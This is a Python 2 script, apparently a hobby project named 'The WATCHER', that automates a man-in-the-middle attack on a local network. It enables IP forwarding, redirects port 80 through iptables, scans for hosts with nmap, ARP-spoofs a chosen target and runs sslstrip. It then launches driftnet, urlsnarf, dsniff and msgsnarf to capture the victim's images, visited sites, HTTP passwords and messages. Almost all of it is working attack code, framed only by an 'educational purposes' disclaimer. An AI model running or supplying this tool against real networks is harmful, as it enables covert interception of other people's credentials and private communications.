#!/usr/bin/env python
#sniffing tool project
"""
this tool can spy on the devices in the local network devices with many options that
can make sniffing on the local network so easy to make it done
this tool take weeks to make it more easier and flexible for all users so we will be thankful
if you can rate our tool on github :D

>>you can make some edits on this script but you can make us know first we will be 
thanked if u do this :D

>>if you found that you can't use this tool you can see our official vedio tutorial on youtube

>>we are not responsible for any bad using of this tool
cause this tool has been made for pentesters and educational purposes only.

>>if you have faced any kind of problems while using our tool you can inform us to our E_mail : 

>>last thing thanks for reading this and have a nice day :D
"""
#Coded & Developed by : David Younan[DevoOverkill9]
#-.- coding: utf-8 -.-

import os
import time
from time import sleep
import sys
import socket, struct

#adding some colors vals

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

HEADER    = '\033[95m'
OKBLUE    = '\033[94m'
OKGREEN   = '\033[92m'
WARNING   = '\033[93m'
FAIL      = '\033[91m'
END	      = '\033[0m'
BOLD      = '\033[1m'
UNDERLINE = '\033[4m'
#====================
Cyan       ="\033[0;36m"
Cafe       ="\033[0;33m"
xxx		   ="\033[0;35m"
blue       ="\033[1;34m"
trans      ="\e[0m"
BOLDxxx    = "\033[0;35m"+"\033[1m"
purple     ="\033[0;35m"


#ip rules

def get_default_gateway_linux():
    with open("/proc/net/route") as fh:
        for line in fh:
           	fields = line.strip().split()
           	if fields[1] != '00000000' or not int(fields[3], 16) & 2:
               		continue
        	return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

gateway_ip = (get_default_gateway_linux())




#os commands

traffic_on = "echo 1 > /proc/sys/net/ipv4/ip_forward"
traffic_redirect = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"


#arpspoof_interface = """"arpspoof -i """
#arpspoof_target = " -t "
#arpspoof_gateway = """ " """
bash = "; bash"
clear = "clear"
exit = "exit"

w = sleep(0.5)

os.system("apt-get install driftnet")
os.system("apt-get install sslstrip")
os.system ("clear")
#Terms & Conditions>
try:
	os.system(clear)
	import terms
except ImportError:
	print ("{0}[{1}x{0}]{2}Error:Some files is NOT FOUND!")
	os.system(exit)

#banner starting../
try:
	os.system(clear)
	import banner
except ImportError:
	print ("{0}[{1}x{0}]{2}Error:Some files is NOT FOUND!")
	os.system(exit)



#installing python-nmap
os.system("pip install python-nmap")
print
#loading...
print ("{}").format(Cafe)
try:
	toolbar_width = 40


	sys.stdout.write("[%s]" % (" " * toolbar_width))
	sys.stdout.flush()
	sys.stdout.write("\b" * (toolbar_width+1)) #after '['

	for i in xrange(toolbar_width):
    		time.sleep(0.1) # do real work here
    		sys.stdout.write("#") #GUI
    		sys.stdout.flush()

	sys.stdout.write("\n")
except KeyboardInterrupt:
	print("{0}[{1}x{0}]{2}Loading Interrupted!").format(Cafe , RED , RED)
	os.system(exit)
print ("{0}[{1}+{0}]{2}OK!").format(WHITE , OKGREEN , OKGREEN)
#nmap can't install Error
try :
	import nmap
except ImportError :
	print ("\n{}[x]Python-nmap can't install").format(RED) 
	print("\n>Try : pip install python-nmap")
	os.system(exit)

try:
	print """
	"""
	sleep(0.5)
	#Redirecting Traffic to the client >>
	print ("\n{0}Do you want to get network traffic now? ({1}y{0}/{2}n{0}) : ").format(OKGREEN , WHITE , RED)
	print ("{}").format(BLUE)
	traffic = raw_input("\nThe WATCHER > ")
	
	if traffic == "y" :
		
		print ("\n{}Starting...").format(OKGREEN)
		sleep(0.5)
		print ("\n{0}[{1}+{0}]{2}Redirecting traffic... ").format(WHITE , RED , Cafe)
		sleep(1.2)
		os.system (traffic_on)
		
		print ("\n{0}[{1}+{0}]{2}Directing traffic to port 8080 ... ").format(WHITE , RED , Cafe)
		sleep(2.2)
		os.system (traffic_redirect)
		
		print ("\n{0}[{1}+{0}]{1}Done").format(WHITE , OKGREEN)
		
		sleep(0.5)
		
		#Get the gateway ip >>
		print ("\n{0}[{1}+{0}]{2}Getting gateway ip...").format(WHITE , RED , BLUE)

		print(gateway_ip)
		
		sleep (0.5)
		print ("\n{0}[{1}*{0}]{2}Scanning targets in progress...").format(WHITE , RED , Cafe)
		print
		
		#using python-nmap
		nm = nmap.PortScanner()
		nm.scan(hosts = gateway_ip+"/24", arguments='-sP')
		hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
		for host, status in hosts_list:
    			print('{3}{0} : {2}{1}'.format(host, status , OKGREEN , Cafe))
		
		#scanning finshed!
		sleep(0.5)
		print ("\n{}Enter your target ip : ").format(BLUE)
		print ("{}").format(BLUE)
		target_ip = raw_input("\nThe WATCHER > ")

		#showing available interfaces
		print"""\n{}Choose between these interfaces: 
		""".format(Cafe)
		sleep(0.5)
		interface_list = "ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'"
		os.system(interface_list)

		print ("\n{}Enter your network interface : ").format(BLUE)
		print ("{}").format(BLUE)
		interface = raw_input("\nThe WATCHER > ")
		#############################################################################################################################################
		sleep (1.0)
		print ("\n{0}[{1}+{0}]{2}Arpspoofing Target! ...").format(WHITE , RED , Cafe) 
		
		arp = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "arpspoof -i {0} -t {1} {2}; bash"'.format(interface , target_ip , gateway_ip)
		os.system (arp)
		
		sleep (2.0)
		print ("\n{0}[{1}+{0}]{2}Arping in progress....").format(WHITE , RED , Cafe)
		sleep (0.5)
		print ("\n{}WARNING: Please don't close any poped up window!").format(RED)
		
		sleep (2.0)
		print ("\n{0}[{1}+{0}]{2}Trying to Decrypt SSL Encryption!...").format(WHITE , RED , RED)
		sleep(0.5)
		sslstrip = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "sslstrip -l 8080; bash"'
		os.system (sslstrip)
		#################################################################################
		
		
		#
		def choices ():
			sleep(5.0)
			os.system(clear)
			print """
			    {0}<{1}Now choose between these options{0}>{1}:
			""".format (RED , WHITE)
			sleep (0.3)
			print"""   {0}[{1}1{0}]{2} Sniff Images
			""".format(YELLOW , RED , WHITE)			
			sleep (0.3)
			print"""   {0}[{1}2{0}]{2} Sniff Websites
			""".format(YELLOW , RED , WHITE)
			sleep (0.3)
			print"""   {0}[{1}3{0}]{2} Sniff HTTP Passwords
			""".format(YELLOW , RED , WHITE)
			sleep (0.3)
			print"""   {0}[{1}4{0}]{2} Sniff Low Encrypted Messages
			""".format(YELLOW , RED , WHITE)
			sleep (0.3)
			print"""   {0}[{1}5{0}]{2} Sniff All
			""".format(YELLOW , RED , WHITE)
			sleep (0.3)
			print """\n{}Press Ctrl+C to exit""".format(RED)
			sleep (0.3)
			print ("{}").format(BLUE)
			client_choice = raw_input ("\nThe WATCHER > ")

			###################################################################
			

			if client_choice == "1":
				sleep (1.0)
				print("\n{0}[{1}+{0}]{2}Sniffing Images").format(RED , WHITE , Cafe)
				driftnet = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "driftnet -i {0} -b; bash"'.format(interface)
				print
				os.system(driftnet)
				return(choices())
			
			elif client_choice == "2":
				sleep (1.0)
				print ("\n{0}[{1}+{0}]{2}Sniffing Websites").format(RED , WHITE , Cafe)
				urlsnarf = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "urlsnarf -i {}; bash"'.format(interface)
				print
				os.system (urlsnarf)
				return(choices())
		
			
			elif client_choice == "3":
				sleep (1.0)
				print ("\n{0}[{1}+{0}]{2}Sniffing HTTP passwords...").format(RED , WHITE , Cafe)
				dsniff = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "dsniff -i {}; bash"'.format(interface)
				print
				os.system(dsniff)
				return(choices())

			elif client_choice == "4":
				sleep (1.0)
				print ("\n{0}[{1}+{0}]{2}Sniffing low encrypted messages...").format(RED , WHITE , Cafe)
				msgsnarf = 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "msgsnarf -i {}; bash"'.format(interface)
				print
				os.system(msgsnarf)
				return(choices())

			elif client_choice == "5":
				sleep (1.0)
				print ("\n{0}Warning{1}: {2}Many pop-ups will appear!").format(RED , WHITE , Cafe)
				sleep (5.0)
				driftnet= 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "driftnet -i {0}; bash"'.format(interface)
				urlsnarf= 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "urlsnarf -i {}; bash"'.format(interface)
				dsniff= 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "dsniff -i {}; bash"'.format(interface)
				msgsnarf= 'gnome-terminal --hide-menubar --geometry=53x17 -x sh -c "msgsnarf -i {}; bash"'.format(interface)
				os.system(driftnet)
				sleep (4.0)
				os.system(urlsnarf)
				sleep (4.0)
				os.system(dsniff)
				sleep (4.0)
				os.system(msgsnarf)
				return(choices())

			else:
				print ("\n{}Wrong Entry!!").format(RED)
				return(choices())

		print(choices())

	elif traffic == "n" :
		print ("\n{0}See ya soon {1}:D").format(Cafe , WHITE)
		print ("\n{0}[{1}x{0}]Exiting...").format(RED , WHITE)
	else:
		print ("\n{}[x]Wrong Entry").format(RED)
		os.system (exit)

except KeyboardInterrupt :
	print ("""\n{0}[{1}x{0}]{2}Program has been ended
Thanks for stopping by!
		""").format(WHITE , RED , RED)
